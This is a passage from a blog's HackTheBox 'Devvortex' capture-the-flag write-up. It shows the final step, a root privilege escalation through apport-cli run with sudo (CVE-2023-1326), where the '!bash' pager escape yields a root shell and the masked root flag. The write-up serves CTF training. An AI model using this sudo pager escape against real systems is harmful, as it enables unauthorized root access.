<pre><code class="language-bash">logan@devvortex:~$ sudo /usr/bin/apport-cli 
No pending crash reports. Try --help for more information.
logan@devvortex:~$ sudo /usr/bin/apport-cli --help
Usage: apport-cli [options] [symptom|pid|package|program path|.apport/.crash file]

Options:
  -h, --help            show this help message and exit
  -f, --file-bug        Start in bug filing mode. Requires --package and an
                        optional --pid, or just a --pid. If neither is given,
                        display a list of known symptoms. (Implied if a single
                        argument is given.)
  -w, --window          Click a window as a target for filing a problem
                        report.
  -u UPDATE_REPORT, --update-bug=UPDATE_REPORT
                        Start in bug updating mode. Can take an optional
                        --package.
  -s SYMPTOM, --symptom=SYMPTOM
                        File a bug report about a symptom. (Implied if symptom
                        name is given as only argument.)
  -p PACKAGE, --package=PACKAGE
                        Specify package name in --file-bug mode. This is
                        optional if a --pid is specified. (Implied if package
                        name is given as only argument.)
  -P PID, --pid=PID     Specify a running program in --file-bug mode. If this
                        is specified, the bug report will contain more
                        information.  (Implied if pid is given as only
                        argument.)
  --hanging             The provided pid is a hanging application.
  -c PATH, --crash-file=PATH
                        Report the crash from given .apport or .crash file
                        instead of the pending ones in /var/crash. (Implied if
                        file is given as only argument.)
  --save=PATH           In bug filing mode, save the collected information
                        into a file instead of reporting it. This file can
                        then be reported later on from a different machine.
  --tag=TAG             Add an extra tag to the report. Can be specified
                        multiple times.
  -v, --version         Print the Apport version number.
</code></pre>

<p>Searching in google we found <a href="https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb">this article</a> that says that we can have privilege escalation for version 2.26.0 and earlier. And our version is:</p>

<pre><code class="language-bash">logan@devvortex:~$ sudo /usr/bin/apport-cli -v
2.20.11
</code></pre>

<p>So it is vulnerable.</p>

<p>Since there is no file in /var/crash, we can manage to create a crash file with the -P pid option that is listed in the help panel. We can do it with any PID of a running process (run ps -ux):</p>

<pre><code class="language-bash">logan@devvortex:/tmp$ sudo /usr/bin/apport-cli -f -P 1343

*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.
.....................

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (7.2 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): V
!id
uid=0(root) gid=0(root) groups=0(root)
!bash
root@devvortex:/tmp# whoami
root
root@devvortex:/tmp# cd
root@devvortex:~# cat root.txt 
c4****************************bb

</code></pre>

<p>And we are root! Hope you liked it!</p>


<div id="share-links">
  <span id="divider-line">____</span>
  <br><br>
  <small>26 April 2024</small>
  <div>
    
    Tags:
    
    <a href="/search?q=joomla" class="tag" style="font-family: 'Cascadia Code';">joomla</a>
    
    <a href="/search?q=CVE-2023-23752" class="tag" style="font-family: 'Cascadia Code';">CVE-2023-23752</a>
    
    <a href="/search?q=information_leakage" class="tag" style="font-family: 'Cascadia Code';">information_leakage</a>
    
    <a href="/search?q=password_reuse" class="tag" style="font-family: 'Cascadia Code';">password_reuse</a>
    
    <a href="/search?q=joomla_rce" class="tag" style="font-family: 'Cascadia Code';">joomla_rce</a>
    
    <a href="/search?q=database_enumeration" class="tag" style="font-family: 'Cascadia Code';">database_enumeration</a>
    
    <a href="/search?q=hash_cracking" class="tag" style="font-family: 'Cascadia Code';">hash_cracking</a>
    
    <a href="/search?q=ssh" class="tag" style="font-family: 'Cascadia Code';">ssh</a>
    
    <a href="/search?q=sudoers" class="tag" style="font-family: 'Cascadia Code';">sudoers</a>
    
    <a href="/search?q=apport-cli" class="tag" style="font-family: 'Cascadia Code';">apport-cli</a>
    
    <a href="/search?q=CVE-2023-1326" class="tag" style="font-family: 'Cascadia Code';">CVE-2023-1326</a>
    
    
</div>
  <br>
  Share this writeup: 
  <a href="javascript:window.open('https://www.facebook.com/sharer.php?u=http://localhost:4000/writeups/2024/HTB/Devvortex.html','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i class="fa fa-facebook-official" aria-hidden="true"></i></a> 
  <a href="javascript:window.open('https://twitter.com/intent/tweet?url=http://localhost:4000/writeups/2024/HTB/Devvortex.html&amp;text=Writeup+for+HackTheBox%20Devvortex%20Writeup+from+HTB+held+on+26%20April%202024&amp;hashtags=ctf,writeup,Devvortex,HTB,joomla,CVE-2023-23752,information_leakage,password_reuse,joomla_rce,database_enumeration,hash_cracking,ssh,sudoers,apport-cli,CVE-2023-1326','Windows','width=600,height=500,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i class="fa fa-twitter" aria-hidden="true"></i></a> 
  <a href="javascript:window.open('https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/writeups/2024/HTB/Devvortex.html&amp;text=Writeup+for+HackTheBox%20Devvortex%20Writeup+from+HTB+held+on+2024-04-26%2000:00:00%20+0200','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i class="fa fa-linkedin" aria-hidden="true"></i></a>
</div>
    </section>
  </div>

  <div id="comments" class="container">
    <section id="disqus_container">
      
    </section>
  </div>

  <footer>
    <div class="social d-flex flex-column justify-content-center w-100">
    <a href="/search" class="text-center w-100 mt-3 mb-2">
      <i class="fa fa-sm fa-search"></i>
    </a>
    <div class="social-links-bar d-flex justify-content-center mb-2">
        
        
        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
        </a>
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
    </div>
    
    <div class="htb_badge d-flex justify-content-center">
        
        <script src="https://www.hackthebox.eu/badge/831031"></script>
        
    </div>
    <div class="thm_badge">
        
    </div>
    
</div>

  </footer>

  <script src="http://localhost:4000/assets/js/prism.js"></script>
  <button onclick="topFunction()" class="fa fa-arrow-up" id="top" title="Go to top"></button>
  <script>
    topScroll = document.getElementById("top");

    window.onscroll = function () { scrollFunction() };

    function scrollFunction() {
      if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
        topScroll.style.display = "block";
      } else {
        topScroll.style.display = "none";
      }
    }

    function topFunction() {
      document.body.scrollTop = 0;
      document.documentElement.scrollTop = 0;
    }

    $(window).on('load', function () {

      $('a[download]').each((i, e) => {
        $(e).addClass('fa fa-download');
      });

      setSizes();
    });

    $(window).resize(setSizes);

    function setSizes() {
      if ($(window).width() < 960) {
        $('#bottom-bar').hide();
        $('footer').show();
        $('#navbarSupportedContent').css('max-height', 'unset');
        $('.navbar-collapse').collapse('hide');
        if (document.body.clientHeight - $('#header').outerHeight() - $('#main_content').outerHeight() - $('#comments').outerHeight() < 150) {
          $('footer').css("position", "unset");
        } else {
          $('footer').css("position", "fixed");
        }
      }
      else {
        $('#bottom-bar').show();
        $('footer').hide();
        $('.navbar-collapse').collapse('show');
        $('footer').css("position", "fixed");
        $('#navbarSupportedContent').css('max-height', (document.body.clientHeight - $('.title-container').outerHeight() - $('#bottom-bar').outerHeight() - $('.navbar-toggler').outerHeight() - 50));
      }
    }
  </script>

</body>

</html>
